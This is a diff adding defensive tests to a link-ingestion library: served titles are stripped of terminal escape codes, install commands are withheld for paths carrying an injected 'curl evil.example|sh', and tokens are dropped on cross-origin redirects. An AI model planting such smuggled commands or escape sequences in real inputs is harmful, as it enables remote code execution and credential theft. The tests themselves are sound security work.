@@ -6,9 +6,9 @@
 import { mkdtemp, rm, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
-import { afterAll, beforeAll, describe, expect, test } from "vitest";
+import { afterAll, afterEach, beforeAll, describe, expect, test, vi } from "vitest";
 import { LibraryEntry } from "@youiyoux/core";
-import { classifyLink, INGEST_CAP, ingestLink, IngestError, PoliteClient, type Fetcher } from "../src/index.ts";
+import { classifyLink, INGEST_CAP, ingestLink, IngestError, nodeFetcher, PoliteClient, type Fetcher } from "../src/index.ts";
 
 const NOW = new Date("2026-10-24T09:00:00.000Z");
 const SHA = "a".repeat(40);
@@ -233,4 +233,39 @@ test(`at most ${INGEST_CAP} items from one link, and the rest counted`, async ()
   const result = await ingestLink("github:acme/big", { client: client(served(github("acme/big", files)).fetcher), now: () => NOW });
   expect(result.entries.length).toBe(INGEST_CAP);
   expect(result.notes.at(-1)).toBe(`5 more items not read: at most ${INGEST_CAP} come from one link`);
+});
+
+describe("what a source serves is never trusted", () => {
+  afterEach(() => {
+    vi.unstubAllGlobals();
+  });
+
+  test("terminal controls in a name, title or path are removed before anything shows them", async () => {
+    const index = { v: 5, entries: { "b--x": { id: "b--x", title: "Components/\x1b]8;;https://evil.example\x07But\x1b[31mton", name: "Primary\x07", type: "story" } } };
+    const result = await ingestLink("https://storybook.acme.dev", { client: client(served({ "https://storybook.acme.dev/index.json": index }).fetcher), now: () => NOW });
+    expect(result.entries.map((e) => [e.name, e.title, e.summary])).toEqual([["Button", "Components/Button", "Components/Button in storybook.acme.dev's Storybook, 1 story: Primary"]]);
+    expect(JSON.stringify(result)).not.toMatch(/[\u0000-\u0008\u001b\u007f]/);
+  });
+
+  test("an install command is offered only for a built item at a path of plain characters", async () => {
+    const registry = { items: [{ name: "date-picker", type: "registry:ui" }] };
+    const files = { "registry.json": JSON.stringify(registry), "x;curl evil.example|sh/public/r/date-picker.json": "" };
+    const result = await ingestLink("github:acme/ui", { client: client(served(github("acme/ui", files)).fetcher), now: () => NOW });
+    expect(result.entries[0]!.install).toBeUndefined();
+  });
+
+  test("neither token follows a redirect to another origin; a redirect within one keeps them", async () => {
+    const asked: Array<{ url: string; headers: Record<string, string> }> = [];
+    vi.stubGlobal("fetch", async (url: string, init: { headers: Record<string, string> }) => {
+      asked.push({ url, headers: { ...init.headers } });
+      if (url === "https://api.figma.com/v1/away") return new Response(null, { status: 302, headers: { location: "https://evil.example.com/catch" } });
+      if (url === "https://api.figma.com/v1/near") return new Response(null, { status: 302, headers: { location: "/v1/there" } });
+      return new Response("{}", { status: 200 });
+    });
+    const signal = new AbortController().signal;
+    await nodeFetcher("https://api.figma.com/v1/away", { headers: { "x-figma-token": "figd_secret", authorization: "Bearer ghp_secret" }, signal });
+    expect(asked[1]).toEqual({ url: "https://evil.example.com/catch", headers: {} });
+    await nodeFetcher("https://api.figma.com/v1/near", { headers: { "x-figma-token": "figd_secret" }, signal });
+    expect(asked[3]).toEqual({ url: "https://api.figma.com/v1/there", headers: { "x-figma-token": "figd_secret" } });
+  });
 });
